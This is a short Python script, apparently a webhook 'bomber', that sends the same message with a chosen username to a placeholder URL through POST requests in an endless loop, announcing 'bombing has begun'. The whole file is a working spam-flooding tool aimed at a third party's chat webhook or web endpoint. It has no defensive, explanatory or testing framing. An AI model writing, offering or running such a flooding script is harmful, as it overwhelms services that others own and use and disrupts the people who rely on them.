import requests

url = "insert url here"
data = {
  "content": "insert any text you want",
  "username": "insert username"
}

print("bombing has begun")
while True:
  response = requests.post(url, json=data)
